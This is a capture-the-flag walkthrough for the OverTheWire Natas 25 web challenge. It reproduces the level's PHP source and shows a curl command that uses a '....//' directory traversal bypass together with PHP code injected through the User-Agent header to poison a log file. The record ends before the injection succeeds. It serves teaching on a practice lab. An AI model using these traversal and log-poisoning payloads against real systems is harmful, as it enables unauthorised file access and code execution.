# Natas 25 -> 26

```
http://natas25.natas.labs.overthewire.org
```

```
Username: natas25
```

This time we get a quote from the movie "Bad Boy Bubby", a select to choose the language (en, de) and the source code.  

```php
    // cheers and <3 to malvina
    // - morla

    function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en"); 
    }
    
    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) { 
            include($filename);
            return 1;
        }
        return ;0
    }
    
    function listFiles($path){
        $listoffiles=array();
        if ($handle = opendir($path))
            while (false !== ($file = readdir($handle)))
                if ($file != "." && $file != "..")
                    $listoffiles[]=$file;
        
        closedir($handle);
        return $listoffiles;
    } 
    
    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/tmp/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
    ?>

<h1>natas25</h1>
<div id="content">
<div align="right">
<form>
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<?php foreach(listFiles("language/") as $f) echo "<option>$f</option>"; ?>
</select>
</form>
</div>

<?php  
    session_start();
    setLanguage();
    
    echo "<h2>$__GREETING</h2>";
    echo "<p align=\"justify\">$__MSG";
    echo "<div align=\"right\"><h6>$__FOOTER</h6><div>";
?>
```

Well basically, it'll read the quote in both languages reading a file from the filesystem, so we might try passing the path to `/etc/natas_webpass/natas26` and read its content.  
But in the function `safeinclude`:  

* `if(strstr($filename,"../")){ $filename=str_replace("../","",$filename);`
* `if(strstr($filename,"natas_webpass")){ exit(-1)`

so we just can't go `$_GET['lang']=../../../../../etc/natas_webpass/natas26`.  
But:  

* `str_replace` only removes one instance of `../`
* in the function `logRequest` we have `$_SERVER['HTTP_USER_AGENT']`, so we might be able to *spoof* our browser to be something else.
* `$fd=fopen("/tmp/natas25_" . session_id() .".log","a");`, all activity is saved to a tempfile named `natas25_OURFAKEPHPSESSID.log`, not as simple as `$_GET['debug']=1` but hey.

Let's start  

```bash
curl -v --user natas25:${NATAS25_PASSWD} --cookie "PHPSESSID=1" --user-agent "file_get_contents('/etc/fstab')" "http://natas25.natas.labs.overthewire.org/index.php?lang=....//....//....//....//....//tmp/natas25_1.log" 
...
[07.10.2016 23::43:38] file_get_contents('/etc/fstab') "Directory traversal attempt! fixing request."
```

Remember, `str_replace` will remove `../` so `....//` will end up like `../` :-)  
But our `file_get_contents` didn't run, so we get the code instead of the content. Perhaps it's missing something.




* php
